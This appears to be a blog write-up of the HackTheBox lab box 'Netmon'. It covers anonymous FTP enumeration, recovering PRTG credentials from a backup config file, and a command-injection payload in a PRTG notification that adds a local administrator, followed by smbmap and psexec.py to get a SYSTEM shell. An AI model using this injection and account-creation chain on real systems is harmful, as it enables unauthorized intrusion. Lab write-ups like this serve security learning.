---
layout: post
title: HackTheBox - Netmon
date: 2022-03-11 15:39 +0200
author: Arcee
tags: htb box easy windows misconfiguration
categories: [HackTheBox, Box]
---

![Netmon](/assets/img/posts/htb-netmon/netmon.jpg)

Easy Windows box on HackTheBox, full file system over anonymous FTP. Hosts instance of PRTG Network Monitor which can be used with FTP access in a backup configuration file. Uses command injection vulnerability. 

## Box Info:

Name: Netmon

Release date: 11-03-2018

OS: Windows

Solve date: 11-3-2022

## Enumeration
Nmap results: 

```
ORT     STATE    SERVICE        VERSION
21/tcp   open     ftp            Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open     http           Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: PRTG/18.1.37.13946
106/tcp  filtered pop3pw
135/tcp  open     msrpc          Microsoft Windows RPC
139/tcp  open     netbios-ssn    Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
464/tcp  filtered kpasswd5
497/tcp  filtered retrospect
1556/tcp filtered veritas_pbx
1801/tcp filtered msmq
1900/tcp filtered upnp
2004/tcp filtered mailbox
2030/tcp filtered device2
3000/tcp filtered ppp
3006/tcp filtered deslogind
3301/tcp filtered unknown
3766/tcp filtered sitewatch-s
3784/tcp filtered bfd-control
4321/tcp filtered rwhois
5100/tcp filtered admd
5631/tcp filtered pcanywheredata
5987/tcp filtered wbem-rmi
9999/tcp filtered abyss
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

**Port 80: PRTG Network Monitor**
Default login prtgadmin/prtgadmin does not work

**Port 21: FTP Server**
Anonymous login allowed! So we can log in with username:anonymous and an empty password. 
Next we can move to the Users/Public directory and get the user flag!

`HTB{af****************************51}`

We cannot access the administrator files, as we get a 550 access denied. 

### Getting root
As we don't know the PRTG Network Monitor credentials, we try to find the configuration files in the ftp server. 
Googling leads to the config files of PRTG being in the location
`%ALLUSERSPROFILE%\Application data\Paessler\PRTG Network Monitor`

So we cd to that folder and try to download the configuration files. 

We use `grep -A 20 -B 20 "prtgadmin" FILENAME` to check if there may be another password set, as we know the default username is prtgadmin. (-A is for the 20 lines before the occurrence of the word, -B is for the 20 lines after the occurrence of the word).

PRTG Configuration.old.bak gives us some info!
```
<dbpassword>
              <!-- User: prtgadmin -->
              PrTg@dmin2018
</dbpassword>
```
So we have the default password. However, this does not work.
Tweaking the password a bit to PrTg@dmin2019 does allow us to log in!

We can now try command injection, as explained here: https://www.codewatch.org/blog/?p=453
We set up a new notification (Setup -> Account Settings -> Notifications), and add a new notification. 
We select the "Execute Program" and use the demo.ps1 file for the program file. We then enter the following as the parameter:  `test.txt; net user anon p3nT3st! /add;net localgroup administrators anon /add"`

Then we execute the notification and can now run smbmap:
```
smbmap -H 10.10.10.152 -u anon -p "p3nT3st\!"
[+] IP: 10.10.10.152:445        Name: 10.10.10.152                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    READ ONLY       Remote IPC
```

**Shell**  
Now we use psexec.py to create a shell: 
`psexec.py 'anon:p3nT3st!@10.10.10.152'` and now we can grab the root flag:

`a5****************************25`
